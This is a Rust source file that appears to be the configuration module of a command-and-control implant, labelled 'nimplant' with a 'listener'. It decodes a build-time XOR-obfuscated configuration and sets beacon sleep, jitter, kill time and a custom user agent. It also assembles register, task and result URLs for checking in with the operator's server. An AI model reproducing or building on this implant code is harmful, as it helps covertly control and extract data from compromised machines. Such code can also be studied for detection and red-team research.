use serde::{Serialize, Deserialize};
use crate::internal::crypto::xor_bytes;
use reqwest::header::{HeaderMap, HeaderValue, USER_AGENT};

pub(crate) enum Endpoint {
    REGISTER,
    TASK,
    RESULT,
}

#[derive(Serialize, Deserialize, PartialEq, Debug, Clone)]
pub(crate) struct C {
    #[serde(rename = "listener")]
    pub(crate) l: L,
    #[serde(rename = "nimplant")]
    pub(crate) n: N,
}

#[derive(Serialize, Deserialize, PartialEq, Debug, Clone)]
pub(crate) struct L {
    #[serde(rename = "type")]
    pub(crate) l_type: String,
    pub(crate) hostname: Option<String>,
    pub(crate) ip: Option<String>,
    pub(crate) port: Option<u32>,
    #[serde(rename = "registerPath")]
    pub(crate) i_path: String,
    #[serde(rename = "taskPath")]
    pub(crate) t_path: String,
    #[serde(rename = "resultPath")]
    pub(crate) r_path: String,
}

#[derive(Serialize, Deserialize, PartialEq, Debug, Clone)]
pub(crate) struct N {
    #[serde(rename = "sleepTimeSeconds")]
    pub(crate) st: u32,
    #[serde(rename = "sleepJitterPercent")]
    pub(crate) sj: f64,
    #[serde(rename = "killTimeHours")]
    pub(crate) kt: u32,
    #[serde(rename = "userAgent")]
    pub(crate) ua: String,
}

#[inline(never)]
pub(crate) fn get() -> C {
    let x = get_xor_key();

    let raw_bytes = include!(concat!(env!("OUT_DIR"), "/_config.rs"));
    let xored_bytes = xor_bytes(&raw_bytes, x);
    let raw_config = match std::str::from_utf8(&xored_bytes[..]) {
        Ok(v) => v,
        Err(e) => panic!("Invalid UTF-8 sequence: {}", e),
    };

    let c: C = toml::from_str(raw_config).unwrap();

    return c;
}

#[inline(always)]
pub(crate) fn get_xor_key() -> i64 {
    include!(concat!(env!("OUT_DIR"), "/xor_key.rs"))
}

pub(crate) fn headers() -> HeaderMap {
    let c = get();

    let mut headers = HeaderMap::new();

    headers.append(USER_AGENT, HeaderValue::from_str(c.n.ua.as_str()).unwrap());

    return headers
}

pub(crate) fn endpoint_for_file(id: String, file_id: String) -> String {
    let c = get();

    let host = get_host(c.l.clone());

    return format!("{}{}/{}?id={}", host, c.l.t_path, file_id, id)
}

pub(crate) fn endpoint_for_id(endpoint: Endpoint, id: String) -> String {
    let c = get();

    let host = get_host(c.l.clone());

    return match endpoint {
        Endpoint::REGISTER => format!("{}{}?id={}", host, c.l.i_path, id),
        Endpoint::TASK => format!("{}{}?id={}", host, c.l.t_path, id),
        Endpoint::RESULT => format!("{}{}?id={}", host, c.l.r_path, id),
    }
}

pub(crate) fn endpoint(endpoint: Endpoint) -> String {
    let c = get();

    let host = get_host(c.l.clone());

    return match endpoint {
        Endpoint::REGISTER => format!("{}{}", host, c.l.i_path),
        Endpoint::TASK => format!("{}{}", host, c.l.t_path),
        Endpoint::RESULT => format!("{}{}", host, c.l.r_path),
    }
}

fn get_host(l: L) -> String {
    let p = l.l_type.to_ascii_lowercase();
    let h = l.hostname.unwrap();

    return match h.is_empty() {
        true => format!("{}://{}:{}", p, l.ip.unwrap(), l.port.unwrap()),
        false => format!("{}://{}", p, h)
    };
}